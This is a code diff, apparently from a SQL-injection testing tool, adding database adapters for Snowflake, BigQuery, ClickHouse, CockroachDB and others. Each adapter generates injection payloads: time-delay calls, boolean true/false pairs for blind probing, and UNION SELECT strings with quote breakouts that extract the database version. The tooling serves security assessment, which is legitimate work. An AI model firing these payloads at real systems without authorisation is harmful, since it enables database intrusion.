@@ -487,6 +487,113 @@ export class GenericAdapter implements DatabaseAdapter {
   }
 }
 
+export class SnowflakeAdapter implements DatabaseAdapter {
+  readonly dbmsType: DbmsType = 'Snowflake';
+  readonly commentSyntax = ['--', '//', '/* */'];
+  readonly stringConcat = (a: string, b: string) => `${a}||${b}`;
+  readonly safeVersionQueries = ['CURRENT_VERSION()', '(SELECT CURRENT_VERSION())'];
+  readonly timeDelayPayloads = (s: number) => [`SYSTEM$WAIT(${s})`];
+  readonly booleanTrueFalsePairs = [
+    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
+    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
+    { trueCondition: 'CURRENT_VERSION() IS NOT NULL', falseCondition: 'CURRENT_VERSION() IS NULL', description: 'Snowflake session verification' },
+  ];
+  readonly safeCatalogQueries = ['SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 20'];
+  readonly nullCast = () => 'NULL';
+
+  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
+    const isNum = /^\d+$/.test(param.originalValue.trim());
+    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
+    const wrapped = MetadataExtractor.wrapWithDelimiters('CURRENT_VERSION()', 'VER', 'Snowflake');
+    const parts: string[] = [];
+    for (let i = 1; i <= columnCount; i++) {
+      if (i === renderColumn) parts.push(wrapped);
+      else parts.push('NULL');
+    }
+    return `${unionPrefix}${parts.join(',')}-- `;
+  }
+}
+
+export class BigQueryAdapter implements DatabaseAdapter {
+  readonly dbmsType: DbmsType = 'Google BigQuery';
+  readonly commentSyntax = ['--', '#', '/* */'];
+  readonly stringConcat = (a: string, b: string) => `CONCAT(${a},${b})`;
+  readonly safeVersionQueries = ['@@version', "'Google BigQuery'"];
+  readonly timeDelayPayloads = (_s: number) => [
+    '(SELECT COUNT(*) FROM UNNEST(GENERATE_ARRAY(1, 2000000)))',
+  ];
+  readonly booleanTrueFalsePairs = [
+    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
+    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
+  ];
+  readonly safeCatalogQueries = ['SELECT table_name FROM `region-us`.INFORMATION_SCHEMA.TABLES LIMIT 20'];
+  readonly nullCast = () => 'NULL';
+
+  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
+    const isNum = /^\d+$/.test(param.originalValue.trim());
+    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
+    const wrapped = MetadataExtractor.wrapWithDelimiters("'Google BigQuery'", 'VER', 'Google BigQuery');
+    const parts: string[] = [];
+    for (let i = 1; i <= columnCount; i++) {
+      if (i === renderColumn) parts.push(wrapped);
+      else parts.push('NULL');
+    }
+    return `${unionPrefix}${parts.join(',')}-- `;
+  }
+}
+
+export class ClickHouseAdapter implements DatabaseAdapter {
+  readonly dbmsType: DbmsType = 'ClickHouse';
+  readonly commentSyntax = ['--', '/* */'];
+  readonly stringConcat = (a: string, b: string) => `concat(${a},${b})`;
+  readonly safeVersionQueries = ['version()'];
+  readonly timeDelayPayloads = (s: number) => [`sleep(${s})`];
+  readonly booleanTrueFalsePairs = [
+    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
+    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
+  ];
+  readonly safeCatalogQueries = ['SELECT name FROM system.tables LIMIT 20'];
+  readonly nullCast = () => 'NULL';
+
+  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
+    const isNum = /^\d+$/.test(param.originalValue.trim());
+    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
+    const wrapped = MetadataExtractor.wrapWithDelimiters('version()', 'VER', 'ClickHouse');
+    const parts: string[] = [];
+    for (let i = 1; i <= columnCount; i++) {
+      if (i === renderColumn) parts.push(wrapped);
+      else parts.push('NULL');
+    }
+    return `${unionPrefix}${parts.join(',')}-- `;
+  }
+}
+
+export class CockroachDBAdapter implements DatabaseAdapter {
+  readonly dbmsType: DbmsType = 'CockroachDB';
+  readonly commentSyntax = ['--', '/* */'];
+  readonly stringConcat = (a: string, b: string) => `${a}||${b}`;
+  readonly safeVersionQueries = ['version()'];
+  readonly timeDelayPayloads = (s: number) => [`pg_sleep(${s})`];
+  readonly booleanTrueFalsePairs = [
+    { trueCondition: '1=1', falseCondition: '1=2', description: 'Numeric equality' },
+    { trueCondition: "'a'='a'", falseCondition: "'a'='b'", description: 'String equality' },
+  ];
+  readonly safeCatalogQueries = ['SELECT table_name FROM information_schema.tables LIMIT 20'];
+  readonly nullCast = () => 'NULL';
+
+  public getVersionExtractionQuery(param: CandidateParameter, renderColumn: number, columnCount: number): string {
+    const isNum = /^\d+$/.test(param.originalValue.trim());
+    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
+    const wrapped = MetadataExtractor.wrapWithDelimiters('version()', 'VER', 'CockroachDB');
+    const parts: string[] = [];
+    for (let i = 1; i <= columnCount; i++) {
+      if (i === renderColumn) parts.push(wrapped);
+      else parts.push('NULL');
+    }
+    return `${unionPrefix}${parts.join(',')}-- `;
+  }
+}
+
 export const DATABASE_ADAPTERS: Record<DbmsType, DatabaseAdapter> = {
   Oracle: new OracleAdapter(),
   PostgreSQL: new PostgreSQLAdapter(),
@@ -497,6 +604,26 @@ export const DATABASE_ADAPTERS: Record<DbmsType, DatabaseAdapter> = {
   'IBM Db2': new Db2Adapter(),
   H2: new H2Adapter(),
   'Microsoft Access': new AccessAdapter(),
+  Snowflake: new SnowflakeAdapter(),
+  'Google BigQuery': new BigQueryAdapter(),
+  ClickHouse: new ClickHouseAdapter(),
+  CockroachDB: new CockroachDBAdapter(),
+  YugabyteDB: new PostgreSQLAdapter(),
+  Vitess: new MySQLAdapter(),
+  SingleStore: new MySQLAdapter(),
+  DuckDB: new GenericAdapter(),
+  'Apache Doris': new MySQLAdapter(),
+  'Databricks SQL': new GenericAdapter(),
+  Trino: new GenericAdapter(),
+  Presto: new GenericAdapter(),
+  'Amazon Redshift': new PostgreSQLAdapter(),
+  'Azure Synapse': new MSSQLAdapter(),
+  Teradata: new GenericAdapter(),
+  Firebird: new GenericAdapter(),
+  'SAP HANA': new GenericAdapter(),
+  Vertica: new GenericAdapter(),
+  TimescaleDB: new PostgreSQLAdapter(),
+  AlloyDB: new PostgreSQLAdapter(),
   'Generic SQL': new GenericAdapter(),
   Unknown: new GenericAdapter(),
 };
